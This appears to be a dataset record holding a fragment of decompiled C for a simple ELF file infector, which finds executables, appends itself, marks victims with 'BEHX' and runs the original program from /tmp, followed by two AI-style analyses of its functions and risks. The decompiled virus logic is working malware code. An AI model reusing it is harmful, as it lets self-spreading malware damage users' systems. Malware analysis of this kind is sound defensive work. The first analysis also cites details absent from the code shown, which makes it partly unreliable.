v3 = fgetc(stream);
*(_DWORD *)&v16[4 * v12++] = v3;
}
fclose(stream);
v18 = fopen(v11, ""rb"");
while ( v12 < binary_file_length + v9 )
{
v4 = fgetc(v18);
*(_DWORD )&v16[4 * v12++] = v4;
}
fclose(v18);
v19 = fopen(v11, ""wb"");
if ( v19 )
{
for ( i = 0LL; i < v9 + binary_file_length; ++i )
fputc((_DWORD *)&v16[4 * i], v19);
fclose(v19);
LODWORD(result) = 1;
}
else
{
LODWORD(result) = 0;
}
return (unsigned int)result;
}
//----- (000000000000165C) ----------------------------------------------------
__int64 __fastcall extract_main_elf_from_virus(const char *a1, const char *a2, __int64 a3, __int64 a4)
{
int v4; // w0
__int64 v5; // x1
unsigned int v6; // w19
int *v7; // x0
char *v8; // x0
__mode_t mode; // [xsp+4Ch] [xbp+4Ch]
__int64 i; // [xsp+50h] [xbp+50h]
__int64 binary_file_length; // [xsp+58h] [xbp+58h]
FILE *stream; // [xsp+60h] [xbp+60h]
FILE *v18; // [xsp+68h] [xbp+68h]
char nptr[8]; // [xsp+70h] [xbp+70h] BYREF
binary_file_length = get_binary_file_length(a1);
stream = fopen(a1, ""rb"");
v18 = fopen(a2, ""wb"");
fseek(stream, a3, 0);
for ( i = 0LL; i < binary_file_length - a3 - a4; ++i )
{
v4 = fgetc(stream);
fputc(v4, v18);
}
fclose(stream);
fclose(v18);
strcpy(nptr, ""0755"");
mode = strtol(nptr, 0LL, 8);
if ( chmod(a2, mode) < 0 )
{
v6 = *__errno_location();
v7 = __errno_location();
v8 = strerror(*v7);
printf(""error in chmod() - %d (%s)\n"", v6, v8);
}
return v5;
}
// 17B8: variable 'v5' is possibly undefined
//----- (00000000000017C8) ----------------------------------------------------
void __fastcall execute_main_elf(const char *a1, char *const *a2, const char *a3, __int64 a4, __int64 a5)
{
__pid_t pid; // [xsp+4Ch] [xbp+4Ch]
extract_main_elf_from_virus(a1, a3, a4, a5);
pid = fork();
if ( pid )
{
waitpid(pid, 0LL, 0);
remove(a3);
}
else if ( execv(a3, a2) < 0 )
{
perror(""execv"");
}
}
//----- (0000000000001854) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
int v3; // w0
__int64 v4; // x0
char *v7; // [xsp+38h] [xbp+38h]
char *target; // [xsp+48h] [xbp+48h]
v7 = (char *)*argv;
execute_payload();
v3 = strlen(""BEHX"");
target = find_target(""BEHX"", v3);
if ( target && (unsigned int)infect(target, v7, 13912LL) )
mark_victim(target, ""BEHX"");
if ( !is_origin_virus(v7) )
{
v4 = strlen(""BEHX"");
execute_main_elf(v7, (char *const *)argv, ""/tmp/behx"", 13912LL, v4);
}
return 0;
}
//----- (0000000000001920) ----------------------------------------------------
void term_proc()
{
;
}
// nfuncs=78 queued=19 decompiled=19 lumina nreq=0 worse=0 better=0
// ALL OK, 19 function(s) have been successfully decompiled",Timeout occurred.,"1. The primary functionality of the code is that of a simplistic computer virus. It seeks out executable files, determines whether they are infected, and appends its payload to uninfected executables. Additionally, it can execute its payload and attempt to conceal its presence.

2. `infect`: This function attaches the virus code to a target executable file. `find_target`: It searches the current directory for viable target files to infect. `is_infected`: Checks if a file has already been infected by comparing the end of the file against a marker.

3. `local_38`: In the context of the `infect` function, this variable holds the length of the target binary that's going to be infected. It's used to determine where in the target file to start appending the virus code.

4. The error handling mechanism in this code employs standard library functions that set an error number to indicate a specific error. For instance, it uses `perror` to print errors related to system calls and `strerror` to get error messages corresponding to error numbers.

5. The `infect` function first computes the necessary buffer size and initializes it. It then opens the original virus file and reads its content into the buffer, followed by opening the target file, appending the virus content to it, and writing the combined content back.

6. The code snippet depends on standard C libraries for file operations (`stdio.h`), directory access (`dirent.h`), dynamic memory allocation (`stdlib.h`), string manipulation (`string.h`), and system error numbers (`errno.h`).

7. Evident security concerns include lack of proper input validation which might lead to buffer overflow vulnerabilities, usage of unsafe functions like `strcpy` and `sprintf`, potential for format string vulnerabilities, and lack of secure file handling which could be exploited to cause damage to the filesystem.","1. The primary functionality of the code is that of a simple virus. It seems to be designed to infect other executable files, marking them in some way, possibly to track or control them, and to replicate itself.

2. Key functions:
   - `find_target`: Searches the current directory for eligible files to infect, excluding ""."", "".."", and already infected files.
   - `infect`: Infects the target file by appending the virus code to it.
   - `execute_main_elf`: Extracts the main executable from the infected file and runs it, ensuring the virus remains transparent to the user.

3. The variable `target` in the `main` function is a pointer to a character string that serves as the filename of the chosen target file to infect. After being assigned the result from `find_target`, it is used to determine if there is a file to infect and pass to other functions for further actions.

4. The error handling mechanism is rudimentary. For example, `chmod` in `extract_main_elf_from_virus` checks if the operation is less than 0 (indicating an error) and then prints an error message. However, the program does not take any corrective action or prevent further execution.

5. Flow of execution in `main`:
   - Call `execute_payload` which simply prints a message.
   - Retrieve the current executable's name and find a target file to infect using `find_target`.
   - If a target is found and can be infected by `infect`, it gets marked by `mark_victim`.
   - If the current file is not the original virus, call `execute_main_elf`, which will execute the legitimate payload.

6. No specific external libraries or dependencies are listed within the provided code besides standard C libraries for file manipulation, directory traversal, process forking, and string handling, such as `stdio.h`, `stdlib.h`, `string.h`, `sys/types.h`, `dirent.h`, `sys/stat.h`, and `unistd.h`.

7. Evident security concerns include:
   - The virus infects other executables, potentially spreading malware and damaging the system or user files.
   - Using file manipulation functions without thorough validation and sanitation can lead to security vulnerabilities like buffer overflow.
   - The virus‚Äôs payload is executed without user consent, posing a significant security risk."
